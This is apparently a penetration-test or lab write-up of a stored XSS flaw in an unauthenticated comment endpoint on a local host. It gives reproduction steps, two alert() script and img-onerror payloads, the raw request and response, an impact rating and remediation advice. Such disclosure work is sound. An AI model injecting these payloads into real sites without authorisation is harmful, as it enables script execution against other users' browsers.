# Stored XSS in Public Comment Functionality

## 📌 Summary
A Stored Cross-Site Scripting (XSS) vulnerability was identified in the public comment functionality of the application.

User input is submitted to `/api/comment.php` and later rendered in `/comments.php` without sanitization, allowing arbitrary JavaScript execution in any user's browser.

The vulnerability is exploitable without authentication.

---

## 🎯 Affected Endpoints

- POST `/api/comment.php`
- GET `/comments.php`

---

## 🧪 Steps to Reproduce

1. Open the comments page:
http://192.168.1.48:8002/comments.php

2. Submit payload:
<script>alert(1)</script>

3. Request is sent to:
POST /api/comment.php

4. Reload the page

5. Payload executes in browser

---

## 💥 Payloads

Primary:
<script>alert(1)</script>

Secondary:
<img src=x onerror=alert(1)>

---

## 🔍 Proof of Concept

### Request
user=bob&comment=<script>alert(1)</script>

### Response
<b>bob</b>: <script>alert(1)</script>

---

## 📸 Screenshots

### 1. Request
![Request](screenshots/01_request.png)

### 2. Payload injection
![Payload](screenshots/02_payload.png)

### 3. Unsanitized response
![Response](screenshots/03_response.png)

### 4. JavaScript execution
![Execution](screenshots/04_execution.png)

### 5. Stored XSS
![Stored](screenshots/05_stored.png)

### 6. curl exploitation
![curl](screenshots/06_curl_request.png)

### 7. CLI verification (img payload)
![grep img](screenshots/07_curl_grep_img.png)

### 8. CLI verification (alert)
![grep alert](screenshots/08_curl_grep_alert.png)

### 9. Burp confirmation (script)
![burp script](screenshots/09_burp_script.png)

### 10. Burp confirmation (img)
![burp img](screenshots/10_burp_img.png)

### 11. Advanced payload
![advanced](screenshots/11_burp_advanced_payload.png)

---

## ⚠️ Impact

- Arbitrary JavaScript execution
- Stored attack affecting all users
- Client-side compromise
- Phishing and defacement potential

Severity: High

---

## 🧠 Root Cause

User input is embedded into HTML without sanitization or output encoding.

---

## 🛠️ Remediation

- Apply output encoding (HTML escaping)
- Sanitize user input
- Use secure templating engines
- Implement Content Security Policy (CSP)

---

## ✅ Conclusion

The application is vulnerable to Stored XSS in a public, unauthenticated comment system.  
Any user can inject JavaScript that will execute in the browser of other users.
